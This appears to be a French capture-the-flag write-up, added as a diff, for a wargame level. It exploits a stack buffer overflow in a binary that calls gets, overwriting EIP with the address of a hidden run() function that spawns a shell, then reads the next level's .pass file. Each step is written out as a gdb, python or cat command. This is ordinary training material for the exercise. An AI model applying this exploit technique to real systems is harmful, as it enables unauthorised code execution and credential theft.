@@ -1,0 +1,41 @@
+Nous avons un binaire avec une fonction qui n'est pas apeller.
+
+1) objdump -d ./level1
+
+On voit qu'il y a une fonction run a l'adresse 0x08048444 qui fait un fwrite et
+un system.
+
+2) gdb ./level1, start, disas main, disas run
+
+la fonction main appelle gets et remplie buff avec stdin.
+
+Nous devons calculer ou se trouve EIP pour l'ecraser par l'adresse de run.
+
+On cree un pattern de 100 avec un outil en ligne, jason-rush.com par exemple.
+
+3) gdb ./level1, r < Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+On execute notre programme sous gdb avec notre pattern.
+
+Le programme segfault et nous dit que EIP contient une adresse invalide
+(0x63413563)
+
+Avec notre outil on donne cette adresse et nous avons l'offset du debut de EIP
+(76)
+
+4) python -c 'print("\x90" * 76 + "\x44\x84\x04\x08")' > /tmp/payload
+
+On cree notre payload. On remplie notre buffer on ecrase EBP et on arrive sur
+EIP qu'on ecrase lui aussi par l'adresse de la fonction run. (En little endian)
+
+5) cat /tmp/payload | ./level1
+
+le fwrite s'execute, le shell se lance mais le programme segfault directement
+
+il faut ruser et utiliser cat pour pouvoir ecrire.
+
+6) (cat /tmp/payload; cat ) | ./level1
+
+7) cat /home/user/level2/.pass
+
+Finish
